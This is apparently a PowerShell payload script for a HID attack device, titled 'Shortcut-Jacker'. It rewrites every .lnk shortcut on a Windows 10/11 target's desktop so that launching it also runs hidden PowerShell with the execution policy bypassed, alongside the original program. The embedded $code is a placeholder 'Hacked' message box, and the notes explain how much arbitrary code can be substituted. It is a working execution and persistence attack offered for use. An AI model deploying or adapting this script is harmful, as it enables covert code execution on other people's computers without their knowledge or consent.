############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : Shortcut-Jacker   | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Execution         | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################
                                                                                                                                                                                                                                               
<#
.SYNOPSIS
	This is payload used to inject PowerShell code into shortcuts.

.DESCRIPTION 
	This payload will gather information on the shortcuts on your targets desktop.
  	That data will then be manipulated to embed a PowerShell script.
  	This script will be ran in the background when the short cut is. 

#>

############################################################################################################################################################

<#
.NOTES
	The PowerShell code stored in this variable is what will run in the background.
	This field can store a max of 259 VISIBLE characters in that bar however after some testing I found you can store 924 characters int the $code 
	variable and it will still run.
#>  

$code = "Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show('Hacked')"

############################################################################################################################################################

function Get-Shortcut {
  param(
    $path = $null
  )

  $obj = New-Object -ComObject WScript.Shell

  if ($path -eq $null) {
    $pathUser = [System.Environment]::GetFolderPath('StartMenu')
    $pathCommon = $obj.SpecialFolders.Item('AllUsersStartMenu')
    $path = dir $pathUser, $pathCommon -Filter *.lnk -Recurse 
  }
  if ($path -is [string]) {
    $path = dir $path -Filter *.lnk
  }
  $path | ForEach-Object { 
    if ($_ -is [string]) {
      $_ = dir $_ -Filter *.lnk
    }
    if ($_) {
      $link = $obj.CreateShortcut($_.FullName)

      $info = @{}
      $info.Hotkey = $link.Hotkey
      $info.TargetPath = $link.TargetPath
      $info.LinkPath = $link.FullName
      $info.Arguments = $link.Arguments
      $info.Target = try {Split-Path $info.TargetPath -Leaf } catch { 'n/a'}
      $info.Link = try { Split-Path $info.LinkPath -Leaf } catch { 'n/a'}
      $info.WindowStyle = $link.WindowStyle
      $info.IconLocation = $link.IconLocation

      return $info
    }
  }
}

#-----------------------------------------------------------------------------------------------------------

function Set-Shortcut {
  param(
  [Parameter(ValueFromPipelineByPropertyName=$true)]
  $LinkPath,
  $IconLocation,
  $Arguments,
  $TargetPath
  )
  begin {
    $shell = New-Object -ComObject WScript.Shell
  }

  process {
    $link = $shell.CreateShortcut($LinkPath)

    $PSCmdlet.MyInvocation.BoundParameters.GetEnumerator() |
      Where-Object { $_.key -ne 'LinkPath' } |
      ForEach-Object { $link.$($_.key) = $_.value }
    $link.Save()
  }
}

#-----------------------------------------------------------------------------------------------------------

function hijack{
$Link = $i.LinkPath
$Loc = $i.IconLocation
$TargetPath = $i.TargetPath
if($Loc.length -lt 4){$Loc = "$TargetPath$Loc"}
$Target = $i.Target
if(Test-Path -Path "$Link" -PathType Leaf){Set-Shortcut -LinkPath "$Link" -IconLocation "$Loc" -Arguments "-w h -NoP -NonI -Exec Bypass start-process '$TargetPath';$code" -TargetPath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"}
}

#-----------------------------------------------------------------------------------------------------------

Get-ChildItem –Path "$Env:USERPROFILE\Desktop" -Filter *.lnk |Foreach-Object {$i = Get-Shortcut $_.FullName;hijack $_.FullName}
